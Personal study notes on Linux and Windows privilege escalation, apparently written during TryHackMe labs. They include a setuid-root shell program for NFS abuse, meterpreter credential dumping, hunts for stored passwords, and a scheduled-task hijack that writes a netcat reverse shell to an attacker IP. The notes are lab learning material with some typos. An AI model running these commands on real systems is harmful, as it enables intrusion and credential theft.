horizontal - changing unprivileged access
vertical - gaining privileged access

##### accessing THM via openVPN
change to folder with conf. file -> `sudo openvpn USERNAME.ovpn`


## Linux
`id; whoaimi; groups`
to check who I am

`hostname`
can contain usefull info about user

`uname -a`
info about kernel and system versions - check if vulnerable

`cat /proc/version`
kernel, system and additional info (e.g. if `gcc` is installed)


`ls -la /etc/passwd`
check your privileges (maybe you could write?)

`cat /etc/passwd | grep home | cut -d":" -f1`     
```
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```
users with `home` might be worthier of hacking
hash is in place of "x", or it is in `/etc/shadow`

check if you have access to `/etc/shadow` (not likely)


- look for `SUID` binaries
`find / -type f -perm -04000 -ls 2>/dev/null`
- look for `sudo` users
`sudo -l` list what sudo allows

[GTFObin](https://gtfobins.github.io/)

[when only root-write permission](./example/root-write)

`getcap -r / 2>/dev/null` ??????

### copy payloads to target
prepare dir with payloads on local machine
create simple python server on local machine in that dir
check your VPN IP (via `ip a` should be visible)

create `/tmp/payloads` on target
`wget http://ATTACK_MACHINE_IP:PORT/linux-peas.sh`
(without specification "what" to download - will download only index.html - you have to be specific)

POC proof of concept

### Payloads:
Linpeas `shell wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`

LinEnum `shell wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`


### NFS

``` Target
# shows nfs shares and flags
cat /etc/export
```
flag `not_root_squash` - gives root user **of the client** ability to create files that can be used as root on server

``` Kali
# you can detect & list nfs with
sudo nmap --script=nfs-showmount 10.10.137.205


# create tmp dirs to mount shares to
mkdir -p /tmp/nfs/sharefolder
mkdir -p /tmp/nfs/tmp
mkdir -p /tmp/nfs/backup

# mount shares
sudo mount -t nfs 10.10.137.205:/home/ubuntu/shrefolder /tmp/nfs/sharefolder
sudo mount -t nfs 10.10.137.205:/tmp /tmp/nfs/tmp
sudo mount -t nfs 10.10.137.205:/home/backup tmp/nfs/backup

# cleaning up
sudo unmount /tmp/nfs/sharefolder
sudo unmount /tmp/nfs/tmp
sudo unmount /tmp/nfs/backup

rm -rf /tmp/nfs/sharefolder
rm -rf /tmp/nfs/tmp
rm -rf /tmp/nfs/backup

# to see what is mounted (lok for IP for mounted from other systems)
findmnt
df -aTh
```

``` Kali
# to compile
int main() 
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

# compile
sudo su
gcc nfs.c -o nfs -wcat pro
```

## Windows
in meterpreter 
`getuid` 

`load kiwi`
`ps` -> `lsass.exe` look for PID
`migrate 768`
`creds_msv` to retrieve LMNTLM creds
`hashdump` dump of passwd hashes :D

##### RDP
`remote desktop protocol`

`xfreerdp /u:Administrator /p:TryH@ckM3! /cert:ignore /v:3.249.251.67 /w:2000 /h:900`
`/h` & `/w` rozdzielczosc

`hostname`
```
EC2AMAZ-VRVGORG
```
sometimes usefull hostname

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
```
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
```

`wmic product get name,version,vendor`
```
Name                                                            Vendor                                   Version
Amazon SSM Agent                                                Amazon Web Services                      2.3.722.0
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127  Microsoft Corporation                    14.24.28127
Java 8 Update 241                                               Oracle Corporation                       8.0.2410.7
AWS Tools for Windows                                           Amazon Web Services Developer Relations  3.15.945
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127     Microsoft Corporation                    14.24.28127
Google Update Helper                                            Google LLC                               1.3.35.451
AWS PV Drivers                                                  Amazon Web Services                      8.3.2
Java Auto Updater                                               Oracle Corporation                       2.8.241.7
aws-cfn-bootstrap                                               Amazon Web Services                      1.4.31
```
versions of installed programs

`wmic qfe get Caption,Description,HotFixID,InstalledOn`
```
Caption                                     Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=4534119  Update           KB4534119  2/12/2020
http://support.microsoft.com/?kbid=4470502  Update           KB4470502  12/12/2018
http://support.microsoft.com/?kbid=4470788  Security Update  KB4470788  12/12/2018
http://support.microsoft.com/?kbid=4480056  Update           KB4480056  1/9/2019
http://support.microsoft.com/?kbid=4493510  Security Update  KB4493510  4/21/2019
http://support.microsoft.com/?kbid=4499728  Security Update  KB4499728  5/15/2019
http://support.microsoft.com/?kbid=4504369  Security Update  KB4504369  6/12/2019
http://support.microsoft.com/?kbid=4512577  Security Update  KB4512577  9/11/2019
http://support.microsoft.com/?kbid=4512937  Security Update  KB4512937  9/6/2019
http://support.microsoft.com/?kbid=4521862  Security Update  KB4521862  10/9/2019
http://support.microsoft.com/?kbid=4523204  Security Update  KB4523204  11/13/2019
http://support.microsoft.com/?kbid=4524244  Security Update  KB4524244  2/12/2020
http://support.microsoft.com/?kbid=4537759  Security Update  KB4537759  2/12/2020
http://support.microsoft.com/?kbid=4532691  Security Update  KB4532691  2/12/2020
```
last updates

`wmic logicaldisk get caption`
```
Caption
C:
```
looking for outside disks like pendrive. Maybe there are some interesting info

`tasklist /SVC` - prints all processes

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" >> 'C:\Windows\Temp\sys.txt'`
Simple redirection example. For sake of note completeness

`whoami /?`
```
(...)
Examples:
    WHOAMI
    WHOAMI /UPN
    WHOAMI /FQDN
    WHOAMI /LOGONID
    WHOAMI /USER
    WHOAMI /USER /FO LIST
    WHOAMI /USER /FO CSV
    WHOAMI /GROUPS
    WHOAMI /GROUPS /FO CSV /NH
    WHOAMI /CLAIMS
    WHOAMI /CLAIMS /FO LIST
    WHOAMI /PRIV
    WHOAMI /PRIV /FO TABLE
    WHOAMI /USER /GROUPS
    WHOAMI /USER /GROUPS /CLAIMS /PRIV
    WHOAMI /ALL
    WHOAMI /ALL /FO LIST
    WHOAMI /ALL /FO CSV /NH
    WHOAMI /?
```
additional info about `whoami` flags

e.g.
`whoami /priv`
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

`whoami /groups`
```
GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                         
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group 
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group 
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group 
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

`net user`
```
User accounts for \\EC2AMAZ-VRVGORG

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed successfully.
```
to get username (**Administrator**)

When you have username you can:
`net user Administrator`
```
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/3/2020 7:32:57 PM
Password expires             4/14/2020 7:32:57 PM
Password changeable          3/3/2020 7:32:57 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/27/2022 9:15:47 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

`net localgroup Administrators`
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```
to view other members of `Administrators` group


##### networking
`ipconfig /all`
```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : EC2AMAZ-VRVGORG
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.ec2-utilities.amazonaws.com
                                       eu-west-1.compute.internal

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 02-30-BD-8F-99-83
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::7d83:475a:901c:16a1%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.10.33.91(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, August 27, 2022 7:35:23 AM
   Lease Expires . . . . . . . . . . : Saturday, August 27, 2022 10:05:23 AM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 118418632
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-9B-81-7D-02-30-BD-8F-99-83
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

`route print`
```
===========================================================================
Interface List
  4...02 30 bd 8f 99 83 ......AWS PV Network Device #0
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0        10.10.0.1      10.10.33.91     25
        10.10.0.0      255.255.0.0         On-link       10.10.33.91    281
      10.10.33.91  255.255.255.255         On-link       10.10.33.91    281
    10.10.255.255  255.255.255.255         On-link       10.10.33.91    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  169.254.169.123  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.249  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.250  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.251  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.253  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.254  255.255.255.255        10.10.0.1      10.10.33.91     50
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link       10.10.33.91    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link       10.10.33.91    281
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
  169.254.169.254  255.255.255.255        10.10.0.1      25
  169.254.169.250  255.255.255.255        10.10.0.1      25
  169.254.169.251  255.255.255.255        10.10.0.1      25
  169.254.169.249  255.255.255.255        10.10.0.1      25
  169.254.169.123  255.255.255.255        10.10.0.1      25
  169.254.169.253  255.255.255.255        10.10.0.1      25
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  4    281 fe80::/64                On-link
  4    281 fe80::7d83:475a:901c:16a1/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

` netstat -ano`
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       64
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1040
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1608
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2364
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2424
  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       780
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       792
  TCP    10.10.33.91:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.33.91:3389       194.99.105.75:60638    ESTABLISHED     1040
  TCP    [::]:135               [::]:0                 LISTENING       64
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       1040
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       668
  TCP    [::]:49665             [::]:0                 LISTENING       1224
  TCP    [::]:49666             [::]:0                 LISTENING       1608
  TCP    [::]:49667             [::]:0                 LISTENING       2364
  TCP    [::]:49668             [::]:0                 LISTENING       2424
  TCP    [::]:49675             [::]:0                 LISTENING       780
  TCP    [::]:49678             [::]:0                 LISTENING       792
  UDP    0.0.0.0:123            *:*                                    2632
  UDP    0.0.0.0:3389           *:*                                    1040
  UDP    0.0.0.0:5353           *:*                                    1616
  UDP    0.0.0.0:5355           *:*                                    1616
  UDP    10.10.33.91:137        *:*                                    4
  UDP    10.10.33.91:138        *:*                                    4
  UDP    127.0.0.1:59943        *:*                                    2900
  UDP    [::]:123               *:*                                    2632
  UDP    [::]:3389              *:*                                    1040
  UDP    [::]:5353              *:*                                    1616
  UDP    [::]:5355              *:*                                    1616
```

`netsh advfirewall show currentprofile`
```
Public Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

To download "`shell.exe`" from web server
````Shell
(New-Object System.Net.WebClient).Downloadfile("http://<IP>/shell.exe","shell.exe")
````



##### looking for passwd
-   `C:\Unattend.xml`
-   `C:\Windows\Panther\Unattend.xml`
-   `C:\Windows\Panther\Unattend\Unattend.xml`
-   `C:\Windows\system32\sysprep.inf`
-   `C:\Windows\system32\sysprep\sysprep.xml`

leftovers of installation
might exist, and might contain passwords in `base64`

- `type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` - console history
  `type` command in powershell displays content of a txt file

- `cmdkey /list` - to check if some credentials are saved
`runas /savedcred /user:OTHER_USER cmd.exe` - open `cmd` of other user with creds above probably better to use `powershell.exe` AND you can also use some payload that way (e.g. from `OTHER_USER` `C:\Windows\Temp`)

Web servers also might store passwds (e.g. for `db`s):
-   `C:\...\inetpub\wwwroot\web.config`
-   `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
``` fragment_with_pass
 <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>
```

##### tasks

`schtasks` - list alltasks
look for user-configurated ones

`schtasks /query /tn NAME_OF_TASK_TO_FIND /fo list /v`
here we're looking at task `vulntask`
```
Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        8/27/2022 10:47:20 AM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```
important:
```
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
Maybe you can append sth to execute via `schtask.bat` as user `taskusr1`?

`icacls c:\tasks\schtask.bat`
```
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```
We see that all users have full (F) access to `schtask.bat`

Listener on Kali:
`netcat -lvnp 4444`

Reverse shell on Target:
`echo c:\tools\nc64.exe -e cmd.exe 10.18.9.175 4444 > C:\tasks\schtask.bat`
`nc64.exe`- `netcat`
Better to use `cmd` for that one. `ps` did a strange thing and appended unknown character to redirection (INVESTIGATE)

`schtasks /run /tn vulntask`

